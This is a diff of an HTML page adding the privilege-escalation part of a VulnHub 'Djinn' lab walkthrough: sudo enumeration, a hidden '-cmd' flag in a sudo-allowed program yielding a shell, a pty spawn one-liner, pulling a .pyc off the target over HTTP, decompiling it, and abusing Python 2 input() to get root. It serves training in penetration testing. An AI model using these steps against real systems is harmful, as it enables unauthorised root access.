@@ -79,14 +79,135 @@ www-data@djinn:/opt$ cat /home/nitish/.dev/creds.txt&#13;&#10;nitish:p4ssw0rdStr
 www-data@djinn:/opt$ su nitish &#13;&#10;Password: &#13;&#10;nitish@djinn:/opt$ 
     </pre>
 
+    <li>As the user nitish, I check "sudo -l" to see if nitish has any sudo permissions.</li>
 
+    <pre>
+nitish@djinn:~$ sudo -l&#13;&#10;Matching Defaults entries for nitish on djinn:&#13;&#10;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&#13;&#10;&#13;&#10;User nitish may run the following commands on djinn:&#13;&#10;    (sam) NOPASSWD: /usr/bin/genie
+    </pre>
+
+    <li>nitish appears to have sudo permissions to run /usr/bin/genie as the user sam.  While investigating the program "genie" we find a few flags we can use.</li>
+
+    <pre>
+nitish@djinn:~$ sudo -u sam /usr/bin/genie -h&#13;&#10;usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish&#13;&#10;&#13;&#10;I know you&apos;ve came to me bearing wishes in mind. So go ahead make your wishes.&#13;&#10;&#13;&#10;positional arguments:&#13;&#10;  wish                  Enter your wish&#13;&#10;&#13;&#10;optional arguments:&#13;&#10;  -h, --help            show this help message and exit&#13;&#10;  -g, --god             pass the wish to god&#13;&#10;  -p SHELL, --shell SHELL&#13;&#10;                        Gives you shell&#13;&#10;  -e EXEC, --exec EXEC  execute command
+    </pre>
+
+    <li>However, after playing around with it a bit, I find that none of those flags help with anything.  The secret to privescing to Sam using /usr/bin/genie is in the manual for the program.</li>
+
+    <pre>&#13;&#10;man(8)                                                                genie man page                                                                man(8)&#13;&#10;&#13;&#10;NAME&#13;&#10;       genie - Make a wish&#13;&#10;&#13;&#10;SYNOPSIS&#13;&#10;       genie [-h] [-g] [-p SHELL] [-e EXEC] wish&#13;&#10;&#13;&#10;DESCRIPTION&#13;&#10;       genie would complete all your wishes, even the naughty ones.&#13;&#10;&#13;&#10;       We all dream of getting those crazy privelege escalations, this will even help you acheive that.&#13;&#10;&#13;&#10;OPTIONS&#13;&#10;       wish&#13;&#10;&#13;&#10;              This is the wish you want to make .&#13;&#10;&#13;&#10;       -g, --god&#13;&#10;&#13;&#10;              Sometime we all would like to make a wish to god, this option let you make wish directly to God;&#13;&#10;&#13;&#10;              Though genie can&apos;t gurantee you that your wish will be heard by God, he&apos;s a busy man you know;&#13;&#10;&#13;&#10;       -p, --shell&#13;&#10;&#13;&#10;              Well who doesn&apos;t love those. You can get shell. Ex: -p &quot;/bin/sh&quot;&#13;&#10;&#13;&#10;       -e, --exec&#13;&#10;&#13;&#10;              Execute command on someone else computer is just too damn fun, but this comes with some restrictions.&#13;&#10;&#13;&#10;       <mark>-cmd&#13;&#10;&#13;&#10;              You know sometime all you new is a damn CMD, windows I love you.</mark>&#13;&#10;&#13;&#10;SEE ALSO&#13;&#10;       mzfr.github.io&#13;&#10;&#13;&#10;BUGS&#13;&#10;       There are shit loads of bug in this program, it&apos;s all about finding one.&#13;&#10;&#13;&#10;AUTHOR&#13;&#10;       mzfr&#13;&#10;&#13;&#10;1.0                                                                  11 November 2019                                                               man(8)&#13;&#10; Manual page genie(8) line 12/47 (END) (press h for help or q to quit)&#13;&#10;    </pre>
+
+    <li>The manual page shows the "-cmd" flag which we were not previously made aware of.  Using this flag, we get a shell as sam.</li>
+
+    <pre>
+nitish@djinn:~$ sudo -u sam /usr/bin/genie -cmd anything&#13;&#10;my man!!&#13;&#10;$ id        &#13;&#10;uid=1000(sam) gid=1000(sam) groups=1000(sam),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)&#13;&#10;$ python3 -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;);&quot;&#13;&#10;sam@djinn:~$ 
+    </pre>
 
     <br>
     <h2>Privesc - sam</h2>
 
+    <li>As sam I again, check "sudo -l" for any sudo permissions.</li>
+
+    <pre>
+sam@djinn:~$ sudo -l&#13;&#10;Matching Defaults entries for sam on djinn:&#13;&#10;    env_reset, mail_badpass,&#13;&#10;    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&#13;&#10;&#13;&#10;User sam may run the following commands on djinn:&#13;&#10;    (root) NOPASSWD: /root/lago
+    </pre>
+
+    <li>Sam has sudo permissions to use the program /root/lago as root.  I investigate the program a bit.</li>
+
+    <pre>
+sam@djinn:~$ sudo /root/lago&#13;&#10;What do you want to do ?&#13;&#10;1 - Be naughty&#13;&#10;2 - Guess the number&#13;&#10;3 - Read some damn files&#13;&#10;4 - Work&#13;&#10;Enter your choice:
+    </pre>
+
+    <li>I am unable to make any progress exploiting the program at this point.  So I continue to look around for any clues as to how to use it.</li>
+
 
     <br>
-    <h2>Privesc - Root</h2>
+    <h2>Privesc Method #2 - Root</h2>
+
+    <li>There is a file named ".pyc" in Sam's home directory that looks like the source code behind /root/lago.  I initially use the command "strings" to examine the file contents.</li>
+
+    <pre>
+sam@djinn:/home/sam$ strings .pyc
+getuser(
+system(
+randintc
+Working on it!! (
+/home/mzfr/scripts/exp.pyt
+naughtyboi
+Choose a number between 1 to 100: s
+Enter your number: s
+/bin/shs
+Better Luck next time(
+inputR
+numt
+/home/mzfr/scripts/exp.pyt
+guessit
+Enter the full of the file to read: s!
+User %s is not allowed to read %s(
+usert
+path(
+/home/mzfr/scripts/exp.pyt	
+readfiles
+What do you want to do ?s
+1 - Be naughtys
+2 - Guess the numbers
+3 - Read some damn filess
+4 - Works
+Enter your choice: (
+intR
+choice(
+/home/mzfr/scripts/exp.pyt
+options
+work your ass off!!s"
+Do something better with your life(
+/home/mzfr/scripts/exp.pyt
+main'
+__main__N(
+getpassR
+randomR
+__name__(
+/home/mzfr/scripts/exp.pyt
+<module>
+    </pre>
+
+    <li>I can get a feel for how the program works based on the output from "strings" but I cannot full decipher how the program works or at least how to exploit it.  So I transfer the file to my Kali box for further examination.</li>
+    <ul>
+
+        <li>I created a web server</li>
+
+        <pre>
+sam@djinn:/home/sam$ python -m SimpleHTTPServer&#13;&#10;Serving HTTP on 0.0.0.0 port 8000 ...&#13;&#10;10.0.0.1 - - [25/Sep/2021 19:40:50] &quot;GET /.pyc HTTP/1.1&quot; 200 -
+        </pre>
+
+        <li>Then downloaded the file to Kali</li>
+        
+        <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/Djinn/exfiltrated]&#13;&#10;&boxur;&HorizontalLine;$ wget http://10.0.0.20:8000/.pyc                                                                                                                       4 &Cross;&#13;&#10;--2021-09-25 10:10:50--  http://10.0.0.20:8000/.pyc&#13;&#10;Connecting to 10.0.0.20:8000... connected.&#13;&#10;HTTP request sent, awaiting response... 200 OK&#13;&#10;Length: 1749 (1.7K) [application/octet-stream]&#13;&#10;Saving to: &OpenCurlyQuote;.pyc&rsquor;&#13;&#10;&#13;&#10;.pyc                                    100%[=============================================================================&gt;]   1.71K  --.-KB/s    in 0s      &#13;&#10;&#13;&#10;2021-09-25 10:10:50 (501 MB/s) - &OpenCurlyQuote;.pyc&rsquor; saved [1749/1749]  
+        </pre>
+
+    </ul>
+
+    <li>Now I decompile .pyc using uncompyle6</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(venv)&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/Djinn/exfiltrated]&#13;&#10;&boxur;&HorizontalLine;$ uncompyle6 .pyc&#13;&#10;# uncompyle6 version 2.13.3&#13;&#10;# Python bytecode 2.7 (62211)&#13;&#10;# Decompiled from: Python 2.7.18 (default, Jul 14 2021, 08:11:37) &#13;&#10;# [GCC 10.2.1 20210110]&#13;&#10;# Embedded file name: /home/mzfr/scripts/exp.py&#13;&#10;# Compiled at: 2019-11-07 08:05:18&#13;&#10;from getpass import getuser&#13;&#10;from os import system&#13;&#10;from random import randint&#13;&#10;&#13;&#10;def naughtyboi():&#13;&#10;    print &apos;Working on it!! &apos;&#13;&#10;&#13;&#10;&#13;&#10;def guessit():&#13;&#10;    num = randint(1, 101)&#13;&#10;    print &apos;Choose a number between 1 to 100: &apos;&#13;&#10;    s = input(&apos;Enter your number: &apos;)&#13;&#10;    if s == num:&#13;&#10;        system(&apos;/bin/sh&apos;)&#13;&#10;    else:&#13;&#10;        print &apos;Better Luck next time&apos;&#13;&#10;&#13;&#10;&#13;&#10;def readfiles():&#13;&#10;    user = getuser()&#13;&#10;    path = input(&apos;Enter the full of the file to read: &apos;)&#13;&#10;    print &apos;User %s is not allowed to read %s&apos; % (user, path)&#13;&#10;&#13;&#10;&#13;&#10;def options():&#13;&#10;    print &apos;What do you want to do ?&apos;&#13;&#10;    print &apos;1 - Be naughty&apos;&#13;&#10;    print &apos;2 - Guess the number&apos;&#13;&#10;    print &apos;3 - Read some damn files&apos;&#13;&#10;    print &apos;4 - Work&apos;&#13;&#10;    choice = int(input(&apos;Enter your choice: &apos;))&#13;&#10;    return choice&#13;&#10;&#13;&#10;&#13;&#10;def main(op):&#13;&#10;    if op == 1:&#13;&#10;        naughtyboi()&#13;&#10;    elif op == 2:&#13;&#10;        guessit()&#13;&#10;    elif op == 3:&#13;&#10;        readfiles()&#13;&#10;    elif op == 4:&#13;&#10;        print &apos;work your ass off!!&apos;&#13;&#10;    else:&#13;&#10;        print &apos;Do something better with your life&apos;&#13;&#10;&#13;&#10;&#13;&#10;if __name__ == &apos;__main__&apos;:&#13;&#10;    main(options())&#13;&#10;# okay decompiling .pyc
+    </pre>
+
+    <li>From the above code I can see that if I select option 2 for "Choose a number between 1 to 100:" and then enter "num" as my number, I should get a shell.</li>
+    
+    <pre>
+sam@djinn:/home/sam$ sudo /root/lago
+What do you want to do ?
+1 - Be naughty
+2 - Guess the number
+3 - Read some damn files
+4 - Work
+Enter your choice:2
+Choose a number between 1 to 100: 
+Enter your number: num
+# id
+uid=0(root) gid=0(root) groups=0(root)
+    </pre>
+    
+    <li>Root shell achieved.</li>
 
 </body>
 </html>
